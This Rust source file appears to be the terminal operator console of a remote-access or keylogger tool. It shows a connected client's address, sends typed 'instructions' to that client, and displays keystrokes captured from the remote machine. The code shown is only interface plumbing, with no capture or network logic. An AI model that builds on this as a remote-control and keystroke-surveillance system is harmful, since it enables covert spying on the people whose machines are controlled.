use color_eyre::Result;
use crossterm::event::{KeyCode, KeyEvent};
use ratatui::layout::{Constraint, Layout};
use ratatui::text::{Line, Span};
use ratatui::style::{Color, Style};
use ratatui::widgets::{Block, Paragraph, List, ListItem};
use ratatui::{DefaultTerminal, Frame};

use super::Core;

pub enum AppEvent {
    Keylogger(String),
    Terminal(KeyEvent),
    Render,
}

pub struct App {
    input: String,
    character_index: usize,
    messages: Vec<String>,
    instructions: Vec<String>,
    logged_keys: Vec<String>,
    core: Core,
}

impl App {
    pub fn new() -> Self {
        Self {
            input: String::new(),
            messages: Vec::new(),
            instructions: Vec::new(),
            character_index: 0,
            logged_keys: Vec::new(),
            core: Core::new(),
        }
    }

    fn move_cursor_left(&mut self) {
        let cursor_moved_left = self.character_index.saturating_sub(1);
        self.character_index = self.clamp_cursor(cursor_moved_left);
    }

    fn move_cursor_right(&mut self) {
        let cursor_moved_right = self.character_index.saturating_add(1);
        self.character_index = self.clamp_cursor(cursor_moved_right);
    }

    fn enter_char(&mut self, new_char: char) {
        let index = self.byte_index();
        self.input.insert(index, new_char);
        self.move_cursor_right();
    }

    fn byte_index(&self) -> usize {
        self.input
            .char_indices()
            .map(|(i, _)| i)
            .nth(self.character_index)
            .unwrap_or(self.input.len())
    }

    fn delete_char(&mut self) {
        let is_not_cursor_leftmost = self.character_index != 0;
        if is_not_cursor_leftmost {
            let current_index = self.character_index;
            let from_left_to_current_index = current_index - 1;

            let before_char_to_delete = self.input.chars().take(from_left_to_current_index);
            let after_char_to_delete = self.input.chars().skip(current_index);

            self.input = before_char_to_delete.chain(after_char_to_delete).collect();
            self.move_cursor_left();
        }
    }

    fn clamp_cursor(&self, new_cursor_pos: usize) -> usize {
        new_cursor_pos.clamp(0, self.input.chars().count())
    }

    const fn reset_cursor(&mut self) {
        self.character_index = 0;
    }

    fn submit_instructions(&mut self) {
        self.core.apply_instructions(self.input.clone()).unwrap();
        self.instructions.push(self.input.clone());
        self.messages.push(format!("handled instruction(-s): {}", self.input.clone()));
        self.input.clear();
        self.reset_cursor();
    }

    pub fn run(&mut self, terminal: &mut DefaultTerminal) -> Result<()> {
        self.messages.push(format!("client is connected from {}", self.core.addr));

        self.core.render_tui();
        self.core.keylogger();
        self.core.terminal_key_event();

        while let Ok(event) = self.core.receiver.recv() {
            match event {
                AppEvent::Render => {
                    terminal.draw(|frame| self.render(frame))?;
                },
                AppEvent::Terminal(key) => {
                    match key.code {
                        KeyCode::Enter => self.submit_instructions(),
                        KeyCode::Char(to_insert) => self.enter_char(to_insert),
                        KeyCode::Backspace => self.delete_char(),
                        KeyCode::Left => self.move_cursor_left(),
                        KeyCode::Right => self.move_cursor_right(),
                        KeyCode::Esc => break,
                        _ => {}
                    }
                }
                AppEvent::Keylogger(key) => {
                    self.logged_keys.push(key);
                },
            }
        };
        Ok(())
    }

    fn render(&mut self, frame: &mut Frame) {
        let main_layout = Layout::vertical([
            Constraint::Percentage(75),
            Constraint::Percentage(25),
        ]).split(frame.area());

        let sub_layout = Layout::horizontal([
            Constraint::Percentage(50), 
            Constraint::Percentage(50),
        ]).split(main_layout[1]);

        let layout = Layout::vertical([
            Constraint::Percentage(50),
            Constraint::Percentage(50),
        ]).split(sub_layout[0]);

        let user_screen = Paragraph::new("Here should be user screen")
            .style(Style::default().fg(Color::Yellow))
            .block(Block::bordered());
        frame.render_widget(user_screen, main_layout[0]);

        let messages: Vec<ListItem> = self
            .messages
            .iter()
            .map(|m| {
                let content = Line::from(Span::raw(format!("{m}")));
                ListItem::new(content)
            })
            .collect();
        let messages = List::new(messages).block(Block::bordered());
        frame.render_widget(messages, sub_layout[1]);

        let instructions = Paragraph::new(format!(">> {}", self.input.as_str()))
            .style(Style::default().fg(Color::White))
            .block(Block::bordered());
        frame.render_widget(instructions, layout[1]);

        let keys = self
            .logged_keys
            .iter()
            .map(|key| key.to_owned())
            .collect::<String>();

        let keylogger = Paragraph::new(format!("Keylogger: {}", keys))
            .style(Style::default().fg(Color::White))
            .block(Block::bordered());
        frame.render_widget(keylogger, layout[0]);
    }
}
